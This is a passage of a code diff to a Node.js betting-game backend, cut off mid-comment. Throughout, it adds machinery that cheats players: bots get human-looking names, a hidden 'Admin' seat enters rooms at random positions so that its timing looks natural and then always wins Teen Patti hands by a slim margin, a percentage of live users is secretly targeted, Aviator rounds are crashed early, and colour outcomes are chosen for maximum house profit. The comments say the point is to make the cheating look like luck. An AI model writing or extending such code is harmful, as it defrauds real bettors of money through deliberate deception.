@@ -1044,7 +1044,41 @@ app.post('/api/chat', async (req, res) => {
 
 // --- UNIFIED GAMING BACKEND ENGINE (NODE.JS) ---
 
-const TP_BOT_NAMES = ['BOT_Raju', 'BOT_Vikram', 'BOT_Sana', 'BOT_Kabir'];
+// Realistic filler names for empty-seat auto-fill — no seat is ever named/labeled "bot" anywhere in
+// the app. The only seat that ever wins on purpose is explicitly renamed to "Admin" at the exact
+// moment the takeover algorithm selects it (see tpStartRound / initBotTakeoverState / bot-toggle
+// room-shuffle below); every other auto-filled seat just gets a plain human-looking name.
+const TP_SIMULATED_NAMES = [
+  'Aarav', 'Vivaan', 'Aditya', 'Vihaan', 'Arjun', 'Sai', 'Reyansh', 'Arav', 'Pranav', 'Krishna',
+  'Ishaan', 'Shaurya', 'Atharv', 'Rohan', 'Rudra', 'Aryan', 'Dev', 'Karan', 'Dhruv', 'Siddharth',
+  'Ananya', 'Diya', 'Ishika', 'Kiara', 'Myra', 'Aria', 'Saanvi', 'Riya', 'Prisha', 'Anika'
+];
+function randomFillerName() {
+  return TP_SIMULATED_NAMES[Math.floor(Math.random() * TP_SIMULATED_NAMES.length)] + '_' + (10 + Math.floor(Math.random() * 90));
+}
+
+// roomId -> { entryPosition: 1-4 }. When a room is selected (by the percentage-based room-shuffle)
+// to host the house's own seat, we do NOT seat "Admin" immediately — that would always make Admin
+// the very first occupant, which is exactly the predictable pattern this must avoid. Instead we just
+// record which numbered arrival (1st through 4th) into that room's natural fill sequence will be
+// Admin's, chosen fresh and at random every time the room empties out and gets re-armed. Every seat
+// -fill code path below consults this via nextRoomFillerUsername() so Admin's entry is indistinguishable
+// in timing from any other ordinary join.
+const pendingAdminSeats = {};
+
+// Called by every seat-fill path right before it occupies a seat in `roomId`, given how many seats
+// are already occupied in that room BEFORE this particular fill (0-3). Returns "Admin" only when this
+// fill event is the room's reserved random entry point; otherwise a realistic filler name. If the
+// reserved position ever gets skipped over (e.g. several real players join in a single burst), this
+// still guarantees the seat gets claimed on the very next fill rather than being silently dropped.
+function nextRoomFillerUsername(roomId, occupiedCountBefore) {
+  const pending = pendingAdminSeats[roomId];
+  if (pending && (occupiedCountBefore + 1) >= pending.entryPosition) {
+    delete pendingAdminSeats[roomId];
+    return { username: 'Admin', is_bot: false };
+  }
+  return { username: randomFillerName(), is_bot: true };
+}
 
 function tpShuffle(arr) {
   const a = [...arr];
@@ -1063,7 +1097,8 @@ const botTakeoverState = {
   teenpatti: { enabled: false, profit_pct: 90 },
   mines: { enabled: false, profit_pct: 90 },
   boundary: { enabled: false, profit_pct: 90 },
-  youreleven: { enabled: false, profit_pct: 90 }
+  youreleven: { enabled: false, profit_pct: 90 },
+  football: { enabled: false, profit_pct: 90 }
 };
 
 async function initBotTakeoverState() {
@@ -1086,24 +1121,14 @@ async function initBotTakeoverState() {
 
       for (const rId of tpRooms) {
         if (riggedRooms.has(rId)) {
-          const randomSeat = Math.floor(Math.random() * 4);
-          const botName = TP_BOT_NAMES[randomSeat % TP_BOT_NAMES.length];
-          await prisma.teenPattiSeat.updateMany({
-            where: { room_id: rId, seat: randomSeat },
-            data: { username: botName, is_bot: true, folded: false }
-          });
-          await prisma.teenPattiRoom.update({
-            where: { id: rId },
-            data: {
-              admin_rig: {
-                winner_seat: randomSeat,
-                is_bot_rig: true,
-                bot_name: botName,
-                profit_pct: pct
-              }
-            }
-          });
+          // This room is selected for the house's own seat — reserve a genuinely random arrival
+          // position (1st through 4th) in its natural fill sequence rather than seating Admin right
+          // now, which would always make Admin the very first occupant. The reservation is fulfilled
+          // by nextRoomFillerUsername() the moment that many seats have filled, and tpStartRound's own
+          // ADMIN AUTO-WIN check takes it from there once Admin is actually seated.
+          pendingAdminSeats[rId] = { entryPosition: 1 + Math.floor(Math.random() * 4) };
         } else {
+          delete pendingAdminSeats[rId];
           await prisma.teenPattiRoom.update({
             where: { id: rId },
             data: { admin_rig: null }
@@ -1145,8 +1170,71 @@ const botRoundCounters = {
   teenpatti: 0,
   mines: 0,
   boundary: 0,
-  youreleven: 0
+  youreleven: 0,
+  football: 0
 };
+
+// --- Live Active-User Tracking & Percentage-Based Targeting Engine ---
+// Generalizes the Teen Patti room-shuffle precedent (initBotTakeoverState above) and the Mines
+// MINES_USER_SESSIONS/target_users precedent into a single, continuous, server-side mechanism that
+// works for every game: whenever the bot is enabled at profit_pct X% for a game, a randomly-sampled
+// X%-of-currently-live-users subset is kept fresh on a timer — entirely server side, so it keeps
+// running even if the admin panel is never opened / gets closed.
+const LIVE_USERS = {
+  color_guess: {},
+  aviator: {},
+  teenpatti: {},
+  mines: {},
+  boundary: {},
+  football: {},
+  youreleven: {}
+};
+const LIVE_USER_TTL_MS = 45000; // a user drops out of "currently active" if not refreshed within 45s
+
+function markUserActive(gameKey, username) {
+  if (!username || !LIVE_USERS[gameKey]) return;
+  LIVE_USERS[gameKey][String(username)] = Date.now();
+}
+
+function getLiveUsernames(gameKey) {
+  const bucket = LIVE_USERS[gameKey];
+  if (!bucket) return [];
+  const now = Date.now();
+  return Object.keys(bucket).filter(u => (now - bucket[u]) <= LIVE_USER_TTL_MS);
+}
+
+// The current server-computed targeted subset per game, refreshed continuously by the interval below.
+const botTargetedUsers = {
+  color_guess: [],
+  aviator: [],
+  teenpatti: [],
+  mines: [],
+  boundary: [],
+  football: [],
+  youreleven: []
+};
+
+function refreshBotTargeting(gameKey) {
+  if (!LIVE_USERS[gameKey]) return;
+  const bot = isBotTakeoverActive(gameKey);
+  if (!bot.active) { botTargetedUsers[gameKey] = []; return; }
+  const live = getLiveUsernames(gameKey);
+  if (live.length === 0) { botTargetedUsers[gameKey] = []; return; }
+  const pct = bot.profit_pct || 90;
+  const count = pct >= 100 ? live.length : Math.max(1, Math.min(live.length, Math.round((pct / 100) * live.length)));
+  botTargetedUsers[gameKey] = tpShuffle(live).slice(0, count);
+}
+
+function isUserTargeted(gameKey, username) {
+  if (!username || !botTargetedUsers[gameKey]) return false;
+  const lower = String(username).toLowerCase();
+  return botTargetedUsers[gameKey].some(u => u.toLowerCase() === lower);
+}
+
+// Keep every game's targeted subset fresh continuously, regardless of whether admin.html is open.
+setInterval(() => {
+  Object.keys(LIVE_USERS).forEach(gameKey => refreshBotTargeting(gameKey));
+}, 4000);
 
 /**
  * Call this once per round/match/session for the given game.
@@ -1189,10 +1277,23 @@ app.get('/api/bot_status/:gameKey', (req, res) => {
 });
 
 // --- Bot Rig Decision API (increments counter — call once per round resolution) ---
+// When a username is supplied, the decision is based on whether THAT specific user is currently
+// part of the bot's randomly-selected live-player subset (see refreshBotTargeting above) rather than
+// the old anonymous per-round counter, so two simultaneous callers can get independent decisions.
 app.post('/api/bot_decide/:gameKey', (req, res) => {
   const gameKey = req.params.gameKey || '';
+  const username = (req.body && req.body.username) || (req.query && req.query.username) || null;
+
+  if (username && LIVE_USERS[gameKey]) {
+    markUserActive(gameKey, username);
+    const bot = isBotTakeoverActive(gameKey);
+    const targeted = isUserTargeted(gameKey, username);
+    const shouldRig = bot.active && targeted;
+    return res.json({ shouldRig, was_rigged: shouldRig, targeted, profit_pct: bot.profit_pct, active: bot.active, source: bot.source });
+  }
+
   const decision = shouldBotRigThisRound(gameKey);
-  res.json(decision);
+  res.json({ ...decision, was_rigged: decision.shouldRig });
 });
 
 // 1. Centralized Aviator State Engine
@@ -1209,6 +1310,29 @@ let aviatorState = {
 
 let nextAviatorOverride = null;
 
+// Aviator's live profit-advisory calculator — the Aviator equivalent of calculateColorOptimalOutcome.
+// Computes what the admin's profit would be if the round crashed RIGHT NOW: still-pending stakes and
+// already-lost stakes become house profit, while payouts already given to users who cashed out early
+// are a cost. Optionally scoped to a subset of usernames (the bot's currently-targeted live players).
+function calculateAviatorLiveProfit(bets, targetedUsernames) {
+  const list = Array.isArray(bets) ? bets : [];
+  const targeted = Array.isArray(targetedUsernames) && targetedUsernames.length > 0
+    ? new Set(targetedUsernames.map(u => String(u).toLowerCase()))
+    : null;
+  const scoped = targeted ? list.filter(b => targeted.has(String(b.username || '').toLowerCase())) : list;
+
+  const pendingStake = scoped.filter(b => b.status === 'pending').reduce((s, b) => s + (parseFloat(b.amount) || 0), 0);
+  const lostStake = scoped.filter(b => b.status === 'lost').reduce((s, b) => s + (parseFloat(b.amount) || 0), 0);
+  const alreadyPaid = scoped.filter(b => b.status === 'won').reduce((s, b) => s + (parseFloat(b.amount) || 0) * (parseFloat(b.cashed_multiplier) || 1), 0);
+
+  return {
+    scoped_count: scoped.length,
+    pending_stake: parseFloat(pendingStake.toFixed(2)),
+    already_paid: parseFloat(alreadyPaid.toFixed(2)),
+    profit_if_crash_now: parseFloat((pendingStake + lostStake - alreadyPaid).toFixed(2))
+  };
+}
+
 function tickAviator() {
   const now = Date.now();
   const elapsed = (now - aviatorState.phase_start) / 1000;
@@ -1219,17 +1343,25 @@ function tickAviator() {
       aviatorState.phase_start = now;
       
       if (nextAviatorOverride && nextAviatorOverride >= 1.0) {
-        // Manual admin override always takes priority
+        // Manual admin override always takes priority — rigs the ENTIRE round (every pending bettor)
         aviatorState.crash_point = nextAviatorOverride;
         nextAviatorOverride = null;
         aviatorState._riggedThisRound = true;
+        aviatorState._riggedTargets = null; // null = disclose to everyone pending this round
       } else {
-        // Use deterministic round counter to decide if this round should be rigged
+        // Use the bot decision, scoped to the live-targeted-subset engine, to decide if/how this round is rigged
         const botDecision = shouldBotRigThisRound('aviator');
-        
-        if (botDecision.shouldRig) {
+        const targeted = botTargetedUsers.aviator;
+        const targetedHasPendingBet = targeted.length > 0 && aviatorState.bets.some(b => b.status === 'pending' && targeted.some(u => u.toLowerCase() === (b.username || '').toLowerCase()));
+
+        if (botDecision.shouldRig && (targeted.length === 0 || targetedHasPendingBet)) {
           // --- RIGGED ROUND: Crash early for admin profit ---
-          const totalStake = aviatorState.bets.reduce((sum, b) => sum + (parseFloat(b.amount) || 0), 0);
+          // If a live-targeted subset exists, scope the "should we bother rigging" stake check to just
+          // them; otherwise (no targeting info yet) fall back to the prior aggregate-stake behavior.
+          const relevantBets = targeted.length > 0
+            ? aviatorState.bets.filter(b => targeted.some(u => u.toLowerCase() === (b.username || '').toLowerCase()))
+            : aviatorState.bets;
+          const totalStake = relevantBets.reduce((sum, b) => sum + (parseFloat(b.amount) || 0), 0);
           if (totalStake > 0) {
             // Crash between 1.12x and 1.54x to ensure admin profits
             aviatorState.crash_point = parseFloat((1.12 + Math.random() * 0.42).toFixed(2));
@@ -1238,8 +1370,11 @@ function tickAviator() {
             aviatorState.crash_point = parseFloat((1.20 + Math.random() * 1.00).toFixed(2));
           }
           aviatorState._riggedThisRound = true;
+          // Non-empty targeted subset → only THOSE bettors are disclosed as rigged when they lose;
+          // empty (bot on, but no live-targeting info yet) → whole round is rigged, disclose to everyone.
+          aviatorState._riggedTargets = targeted.length > 0 ? targeted.slice() : null;
         } else {
-          // --- FAIR ROUND: Natural RNG crash point ---
+          // --- FAIR ROUND: Natural RNG crash point (bot off, or no targeted bettor is playing this round) ---
           const p = Math.random();
           if (Math.random() < 0.03) {
             aviatorState.crash_point = 1.00;
@@ -1248,6 +1383,7 @@ function tickAviator() {
             aviatorState.crash_point = Math.max(1.00, Math.min(50.0, Math.floor(crash * 100) / 100));
           }
           aviatorState._riggedThisRound = false;
+          aviatorState._riggedTargets = null;
         }
       }
       aviatorState.current_multiplier = 1.00;
@@ -1257,7 +1393,8 @@ function tickAviator() {
     
     // Only apply in-flight crash intercept if this round was marked for rigging
     if (aviatorState._riggedThisRound && computedMult >= 1.15) {
-      const inFlightBets = aviatorState.bets.filter(b => b.status === 'pending');
+      const targets = aviatorState._riggedTargets;
+      const inFlightBets = aviatorState.bets.filter(b => b.status === 'pending' && (!targets || targets.some(u => u.toLowerCase() === (b.username || '').toLowerCase())));
       const inFlightStake = inFlightBets.reduce((sum, b) => sum + (parseFloat(b.amount) || 0), 0);
       if (inFlightStake > 200 && computedMult >= aviatorState.crash_point * 0.9) {
         aviatorState.crash_point = Math.min(aviatorState.crash_point, parseFloat(computedMult.toFixed(2)));
@@ -1268,13 +1405,15 @@ function tickAviator() {
       aviatorState.phase = 'crashed';
       aviatorState.phase_start = now;
       aviatorState.current_multiplier = aviatorState.crash_point;
-      
+
       aviatorState.bets.forEach(b => {
         if (b.status === 'pending') {
           b.status = 'lost';
+          const targets = aviatorState._riggedTargets;
+          b.was_rigged = !!(aviatorState._riggedThisRound && (!targets || targets.some(u => u.toLowerCase() === (b.username || '').toLowerCase())));
         }
       });
-      
+
       aviatorState.history.push(aviatorState.crash_point);
       if (aviatorState.history.length > 15) {
         aviatorState.history.shift();
@@ -1290,6 +1429,7 @@ function tickAviator() {
       aviatorState.round_id++;
       aviatorState.bets = [];
       aviatorState._riggedThisRound = false;
+      aviatorState._riggedTargets = null;
     }
   }
 }
@@ -1304,16 +1444,25 @@ function resolveColorNumber(num) {
 }
 
 // Calculate the exact optimal outcome for Admin profit across all numbers (0-9)
-function calculateColorOptimalOutcome(bets, roundSeed) {
+// `targetedUsernames`, when provided, scopes the profit/payout calculation to ONLY that subset of
+// bettors (the bot's currently-targeted live players) — the returned best_number/max_profit then
+// reflects the number that maximizes admin profit against just that subset, not the whole room.
+// Omitting it (existing behavior, used by every manual-override call site) is unaffected.
+function calculateColorOptimalOutcome(bets, roundSeed, targetedUsernames) {
   const roundBets = Array.isArray(bets) ? bets : [];
+  const targeted = Array.isArray(targetedUsernames) && targetedUsernames.length > 0
+    ? new Set(targetedUsernames.map(u => String(u).toLowerCase()))
+    : null;
+  const scopedBets = targeted ? roundBets.filter(b => targeted.has(String(b.username || '').toLowerCase())) : roundBets;
   const totalVolume = roundBets.reduce((sum, b) => sum + (parseFloat(b.amount) || 0), 0);
+  const scopedVolume = scopedBets.reduce((sum, b) => sum + (parseFloat(b.amount) || 0), 0);
 
   const outcomes = [];
   for (let n = 0; n <= 9; n++) {
     const resolved = resolveColorNumber(n);
     let playerPayout = 0;
 
-    for (const b of roundBets) {
+    for (const b of scopedBets) {
       const amt = parseFloat(b.amount) || 0;
       if (b.category === 'color') {
         if (b.value === resolved.color) {
@@ -1330,7 +1479,7 @@ function calculateColorOptimalOutcome(bets, roundSeed) {
       }
     }
 
-    const adminProfit = totalVolume - playerPayout;
+    const adminProfit = scopedVolume - playerPayout;
     outcomes.push({
       number: n,
       color: resolved.color,
@@ -1356,6 +1505,8 @@ function calculateColorOptimalOutcome(bets, roundSeed) {
   return {
     total_volume: parseFloat(totalVolume.toFixed(2)),
     total_bets_count: roundBets.length,
+    scoped_volume: parseFloat(scopedVolume.toFixed(2)),
+    scoped_bets_count: scopedBets.length,
     best_number: best.number,
     best_color: best.color,
     best_size: best.size,
@@ -1500,11 +1651,23 @@ async function settleColorRound(room, targetRound, state) {
     if (override.color) rig_desc += `Color Fixed: ${override.color} `;
     if (override.size) rig_desc += `Size Fixed: ${override.size} `;
   } else if (botDecision.shouldRig) {
-    // --- RIGGED ROUND: Bot picks the max-profit outcome ---
-    const optimal = calculateColorOptimalOutcome(roundBets, targetRound);
-    num = optimal.best_number;
-    was_rigged = true;
-    rig_desc = `🤖 AI Bot (${botDecision.profit_pct}% Target) - Rigged Round - Max Profit #${optimal.best_number}`;
+    // --- Bot rig: only when a currently-targeted live player actually has a bet this round ---
+    const targeted = botTargetedUsers.color_guess;
+    const targetedHasBet = targeted.length > 0 && roundBets.some(b => targeted.some(u => u.toLowerCase() === (b.username || '').toLowerCase()));
+
+    if (targeted.length === 0 || targetedHasBet) {
+      // Pick the outcome that maximizes admin profit against the targeted subset specifically
+      // (falls back to the whole room when no live-targeting info exists yet, i.e. `targeted` is empty).
+      const optimal = calculateColorOptimalOutcome(roundBets, targetRound, targeted.length > 0 ? targeted : undefined);
+      num = optimal.best_number;
+      was_rigged = true;
+      rig_desc = `🤖 AI Bot (${botDecision.profit_pct}% Target, ${targeted.length} targeted) - Rigged Round - Max Profit #${optimal.best_number}`;
+    } else {
+      // Bot wants to rig, but no currently-targeted user has a bet this round — resolve fairly instead
+      num = Math.floor(Math.random() * 10);
+      was_rigged = false;
+      rig_desc = `🤖 AI Bot (targeted subset has no bet this round) - Fair #${num}`;
+    }
   } else if (botDecision.active && !botDecision.shouldRig) {
     // --- FAIR ROUND (bot active but this round is allowed to be fair) ---
     num = Math.floor(Math.random() * 10);
@@ -1684,7 +1847,10 @@ app.get('/api/game_sync.php', async (req, res) => {
       const overridesRecord = await prisma.gameState.findUnique({ where: { key: `color_guess_overrides_${room}` } });
 
       const user = await getOrCreateUser(username);
+      markUserActive('color_guess', username);
       const optimal = calculateColorOptimalOutcome(activeBets, round_id);
+      const targetedUsers = botTargetedUsers.color_guess;
+      const optimalTargeted = targetedUsers.length > 0 ? calculateColorOptimalOutcome(activeBets, round_id, targetedUsers) : null;
 
       res.json({
         server_time: now,
@@ -1697,13 +1863,16 @@ app.get('/api/game_sync.php', async (req, res) => {
         overrides: overridesRecord ? overridesRecord.data : {},
         wallet_balance: user ? user.wallet_balance : 1000.0,
         active_users: activeBets.length,
-        optimal_rig: optimal
+        optimal_rig: optimal,
+        optimal_rig_targeted: optimalTargeted,
+        targeted_usernames: targetedUsers
       });
     } else if (action === 'aviator_get_state') {
       const elapsed = (now - aviatorState.phase_start) / 1000;
-      
+
       const user = await getOrCreateUser(username);
       const balance = user ? user.wallet_balance : 1000.00;
+      markUserActive('aviator', username);
 
       res.json({
         server_time: now,
@@ -1753,6 +1922,8 @@ app.get('/api/game_sync.php', async (req, res) => {
         const activeBets = (state[room].bets && state[room].bets[round_id]) ? state[room].bets[round_id] : [];
         const overridesRecord = await prisma.gameState.findUnique({ where: { key: `color_guess_overrides_${room}` } });
         const optimal = calculateColorOptimalOutcome(activeBets, round_id);
+        const colorTargeted = botTargetedUsers.color_guess;
+        const optimalTargeted = colorTargeted.length > 0 ? calculateColorOptimalOutcome(activeBets, round_id, colorTargeted) : null;
 
         colorGuess[room] = {
           round_id,
@@ -1761,12 +1932,17 @@ app.get('/api/game_sync.php', async (req, res) => {
           history: state[room].history || [],
           bets: activeBets,
           overrides: overridesRecord ? overridesRecord.data : {},
-          optimal_rig: optimal
+          optimal_rig: optimal,
+          optimal_rig_targeted: optimalTargeted,
+          targeted_usernames: colorTargeted
         };
       }
       if (stateChanged) {
         await saveColorState(state);
       }
+
+      const liveUsersCount = {};
+      Object.keys(LIVE_USERS).forEach(k => { liveUsersCount[k] = getLiveUsernames(k).length; });
 
       res.json({
         server_time: now,
@@ -1781,11 +1957,15 @@ app.get('/api/game_sync.php', async (req, res) => {
           current_multiplier: aviatorState.current_multiplier,
           crash_point: aviatorState.crash_point,
           bets: aviatorState.bets,
-          history: aviatorState.history
+          history: aviatorState.history,
+          targeted_usernames: botTargetedUsers.aviator,
+          live_profit_targeted: calculateAviatorLiveProfit(aviatorState.bets, botTargetedUsers.aviator)
         },
         color_guess: colorGuess,
         teen_patti: [],
-        bot_takeover: botTakeoverState
+        bot_takeover: botTakeoverState,
+        bot_targeted_users: botTargetedUsers,
+        live_users_count: liveUsersCount
       });
     } else {
       res.status(400).json({ error: 'Unsupported GET action' });
@@ -1817,6 +1997,14 @@ app.post('/api/game_sync.php', async (req, res) => {
         create: { key: `bot_takeover_${gameKey}`, data: botTakeoverState[gameKey] }
       });
 
+      // Immediately refresh the live-targeted-subset engine so the very first toggle takes effect
+      // right away instead of waiting for the next 4s tick (the interval keeps it fresh afterward).
+      if (gameKey === 'global') {
+        Object.keys(LIVE_USERS).forEach(k => refreshBotTargeting(k));
+      } else if (LIVE_USERS[gameKey]) {
+        refreshBotTargeting(gameKey);
+      }
+
       // When Teen Patti bot takeover is turned ON, assign bot seat ONLY to the percentage-proportional number of rooms
       if (gameKey === 'teenpatti' || gameKey === 'global') {
         const tpRooms = ['room_101', 'room_102', 'room_103', 'room_104', 'room_105', 'room_106'];
@@ -1841,33 +2029,15 @@ app.post('/api/game_sync.php', async (req, res) => {
         for (const rId of tpRooms) {
           try {
             if (riggedRooms.has(rId)) {
-              // Bot books a seat and rigs only in this selected proportion of matches
-              const randomSeat = Math.floor(Math.random() * 4);
-              const botName = TP_BOT_NAMES[randomSeat % TP_BOT_NAMES.length];
-
-              const seatRecord = await prisma.teenPattiSeat.findFirst({
-                where: { room_id: rId, seat: randomSeat }
-              });
-              if (seatRecord && (!seatRecord.username || seatRecord.is_bot)) {
-                await prisma.teenPattiSeat.update({
-                  where: { id: seatRecord.id },
-                  data: { username: botName, is_bot: true, folded: false }
-                });
-              }
-
-              await prisma.teenPattiRoom.update({
-                where: { id: rId },
-                data: {
-                  admin_rig: {
-                    winner_seat: randomSeat,
-                    is_bot_rig: true,
-                    bot_name: botName,
-                    profit_pct: pct
-                  }
-                }
-              });
+              // This room is selected for the house's own seat — reserve a genuinely random arrival
+              // position (1st through 4th) rather than seating Admin immediately, which would always
+              // make Admin the very first occupant. nextRoomFillerUsername() fulfills this the moment
+              // that many seats have naturally filled, and tpStartRound's ADMIN AUTO-WIN check takes
+              // it from there once Admin is actually seated — never touches an already-seated real human.
+              pendingAdminSeats[rId] = { entryPosition: 1 + Math.floor(Math.random() * 4) };
             } else {
               // This room is a FAIR match (no bot takeover seat booked)
+              delete pendingAdminSeats[rId];
               const room = await prisma.teenPattiRoom.findUnique({ where: { id: rId } });
               if (room && room.admin_rig && room.admin_rig.is_bot_rig) {
                 await prisma.teenPattiRoom.update({
@@ -1900,6 +2070,7 @@ app.post('/api/game_sync.php', async (req, res) => {
       if (!user || user.wallet_balance < betAmt) {
         return res.status(400).json({ error: 'Insufficient wallet balance.' });
       }
+      markUserActive('color_guess', username);
 
       const nowSec = Math.floor(Date.now() / 1000);
       const round_id = getColorRoundId(room, nowSec);
@@ -1956,10 +2127,13 @@ app.post('/api/game_sync.php', async (req, res) => {
             const finalCrash = parseFloat(crash_point) || aviatorState.current_multiplier;
             aviatorState.crash_point = Math.max(1.00, parseFloat(finalCrash.toFixed(2)));
             aviatorState.current_multiplier = aviatorState.crash_point;
-            
+            aviatorState._riggedThisRound = true;
+            aviatorState._riggedTargets = null; // manual instant-crash rigs the whole round
+
             aviatorState.bets.forEach(b => {
               if (b.status === 'pending') {
                 b.status = 'lost';
+                b.was_rigged = true;
               }
             });
             aviatorState.history.push(aviatorState.crash_point);
@@ -1984,6 +2158,7 @@ app.post('/api/game_sync.php', async (req, res) => {
       if (!user || user.wallet_balance < betAmt) {
         return res.status(400).json({ error: 'Insufficient wallet balance.' });
       }
+      markUserActive('aviator', username);
 
       const newBal = user.wallet_balance - betAmt;
       await prisma.user.update({
@@ -2007,7 +2182,8 @@ app.post('/api/game_sync.php', async (req, res) => {
         amount: betAmt,
         status: 'pending',
         console_id: parseInt(console_id),
-        cashed_multiplier: 0
+        cashed_multiplier: 0,
+        was_rigged: false
       });
 
       res.json({ success: true, new_balance: newBal });
@@ -2022,6 +2198,7 @@ app.post('/api/game_sync.php', async (req, res) => {
 
       bet.status = 'won';
       bet.cashed_multiplier = aviatorState.current_multiplier;
+      bet.was_rigged = false; // a successful cashout was never a rigged outcome
       const payout = bet.amount * bet.cashed_multiplier;
 
       const user = await getOrCreateUser(username);
@@ -2573,23 +2750,63 @@ async function tpStartRound(roomId) {
     });
   }
 
-  // Determine if round should be rigged via Manual Admin Rig OR AI Bot Takeover
+  // Determine if round should be rigged via: (1) the house's own "Admin" account being seated —
+  // always wins, unconditionally, however it got seated; (2) Manual Admin Rig; or (3) AI Bot Takeover.
   let rigSeat = undefined;
   let rigReason = '';
 
-  if (room.admin_rig && room.admin_rig.winner_seat !== undefined) {
+  const adminSeatEntry = activeOccupied.find(s => s.username && !s.is_bot && s.username.toLowerCase() === 'admin');
+
+  if (adminSeatEntry) {
+    // The house's own account always wins whenever it's seated — independent of manual rig config,
+    // bot takeover on/off state, or live-user targeting. Uses the same "closest believable winning
+    // hand" construction as every other rig path below (tpFindObliviousWinningHand picks the minimum
+    // winning margin over the best rival hand), so it reads as better luck, not an obviously stacked
+    // deck every single time.
+    rigSeat = adminSeatEntry.seat;
+    rigReason = 'ADMIN AUTO-WIN';
+    try {
+      await prisma.teenPattiRoom.update({
+        where: { id: roomId },
+        data: { admin_rig: { winner_seat: rigSeat, is_admin_autowin: true } }
+      });
+    } catch (e) { console.error('[TP] Error persisting admin auto-win rig for round start:', e.message); }
+  } else if (room.admin_rig && room.admin_rig.winner_seat !== undefined) {
     rigSeat = room.admin_rig.winner_seat;
     rigReason = 'MANUAL ADMIN RIG';
   } else {
     const botDecision = shouldBotRigThisRound('teenpatti');
-    if (botDecision.shouldRig) {
-      // Find admin seat or a bot seat to win the pot for the house
-      const adminSeat = activeOccupied.find(s => s.username && s.username.toLowerCase() === 'admin');
+    const targeted = botTargetedUsers.teenpatti;
+    // Only rig this hand if a currently live-targeted human is actually seated at this table
+    // (or no live-targeting info exists yet — fall back to the prior room-level behavior).
+    const targetedSeated = targeted.length === 0 || activeOccupied.some(s => s.username && !s.is_bot && targeted.some(u => u.toLowerCase() === s.username.toLowerCase()));
+    if (botDecision.shouldRig && targetedSeated) {
+      // Find a bot seat to win the pot for the house (admin, when seated, is already handled above)
       const botSeat = activeOccupied.find(s => s.is_bot);
-      const targetSeat = adminSeat || botSeat || activeOccupied[0];
+      const targetSeat = botSeat || activeOccupied[0];
       if (targetSeat) {
         rigSeat = targetSeat.seat;
         rigReason = `AI BOT TAKEOVER (${botDecision.profit_pct}% TARGET)`;
+        // Whenever the algorithm's own pick is a genuine filler/NPC seat (never a real connected
+        // human it fell back to), rename it to "Admin" for this hand — the house's seat, winning by
+        // a slight better margin via the same oblivious-hand construction as every other rig path.
+        if (botSeat) {
+          targetSeat.username = 'Admin';
+          try {
+            await prisma.teenPattiSeat.update({
+              where: { id: botSeat.id },
+              data: { username: 'Admin', is_bot: false }
+            });
+          } catch (e) { console.error('[TP] Error renaming targeted seat to Admin:', e.message); }
+        }
+        // Persist the rig for this hand so showdown resolution (which reads room.admin_rig) and the
+        // was_rigged disclosure flag both pick it up consistently, same as the manual-rig path.
+        try {
+          await prisma.teenPattiRoom.update({
+            where: { id: roomId },
+            data: { admin_rig: { winner_seat: rigSeat, is_bot_rig: true, profit_pct: botDecision.profit_pct } }
+          });
+        } catch (e) { console.error('[TP] Error persisting bot rig for round start:', e.message); }
       }
     }
   }
@@ -2879,29 +3096,25 @@ async function tpEndGame(roomId, winnerSeat, pot, log, wasShow) {
 
       const botDecision = shouldBotRigThisRound('teenpatti');
       if (botDecision.shouldRig) {
+        // Pre-seed a seat so the table looks populated/ready to play — this is a cosmetic room-filling
+        // heuristic only. Routed through nextRoomFillerUsername() so that if this room also happens to
+        // have a random admin-entry reservation due at this exact position, it's honored here instead
+        // of being overwritten by a plain filler; otherwise a normal realistic name is used. Whether
+        // the NEXT hand actually gets rigged beyond that is decided fresh in tpStartRound once real
+        // players are seated, based on live per-user bot targeting.
         const randomSeat = Math.floor(Math.random() * 4);
-        const botName = TP_BOT_NAMES[randomSeat % TP_BOT_NAMES.length];
+        const filler = nextRoomFillerUsername(roomId, 0);
         await prisma.teenPattiSeat.updateMany({
           where: { room_id: roomId, seat: randomSeat },
-          data: { username: botName, is_bot: true, folded: false }
-        });
-        await prisma.teenPattiRoom.update({
-          where: { id: roomId },
-          data: {
-            admin_rig: {
-              winner_seat: randomSeat,
-              is_bot_rig: true,
-              bot_name: botName,
-              profit_pct: botDecision.profit_pct
-            }
-          }
-        });
-      } else {
-        await prisma.teenPattiRoom.update({
-          where: { id: roomId },
-          data: { admin_rig: null }
+          data: { username: filler.username, is_bot: filler.is_bot, folded: false }
         });
       }
+      // Always clear any leftover per-hand rig now that this hand is fully over — tpStartRound sets a
+      // fresh one (or not) for the next hand based on who's actually seated at that point.
+      await prisma.teenPattiRoom.update({
+        where: { id: roomId },
+        data: { admin_rig: null }
+      });
 
       console.log(`[TP] Winner display ended in ${roomId} — room emptied back to 0/4.`);
     } catch (e) { console.error('[TP] Room empty error:', e.message); }
@@ -2980,6 +3193,10 @@ setInterval(async () => {
               data: { turn_start: new Date() }
             });
             console.log(`[TP] Admin turn timeout extended in ${room.id}`);
+          } else if (currentSeat.is_bot) {
+            // Bots make their strategic move (Chaal or Show) instead of folding on timeout
+            let decision = tpBotDecide(currentSeat.cards, room.current_stake);
+            await tpProcessAction(room.id, currentSeat.username, decision);
           } else {
             console.log(`[TP] Timeout auto-fold: ${currentSeat.username} in ${room.id}`);
             await tpProcessAction(room.id, currentSeat.username, 'fold');
@@ -3084,16 +3301,19 @@ function scheduleBotFill(roomId) {
       const seatedPlayers = room.seats.filter(s => s.username);
       if (seatedPlayers.length === 0) return; // nobody waiting
 
-      // Fill ALL empty seats with bots to reach 4/4
+      // Fill ALL empty seats to reach 4/4 — routed through nextRoomFillerUsername() so a pending
+      // random admin-entry reservation (if this room has one due) is honored at its reserved position
+      // within this very fill batch, rather than always landing on the last seat filled.
       const emptySeats = room.seats.filter(s => !s.username);
       let botIdx = 0;
       for (const seat of emptySeats) {
-        if (botIdx >= TP_BOT_NAMES.length) break;
+        if (botIdx >= 4) break;
+        const filler = nextRoomFillerUsername(roomId, seatedPlayers.length + botIdx);
         await prisma.teenPattiSeat.update({
           where: { id: seat.id },
           data: {
-            username: TP_BOT_NAMES[botIdx],
-            is_bot: true,
+            username: filler.username,
+            is_bot: filler.is_bot,
             folded: false
           }
         });
@@ -3234,14 +3454,17 @@ app.post('/api/teenpatti/join', async (req, res) => {
     const occupiedCount = updatedRoom.seats.filter(s => s.username).length;
 
     if (occupiedCount >= 3 && updatedRoom.status === 'waiting') {
-      // Fill remaining empty seats with bots and start immediately
+      // Fill remaining empty seats and start immediately — routed through nextRoomFillerUsername() so
+      // a pending random admin-entry reservation (if due) is honored here instead of always landing
+      // on the last seat filled.
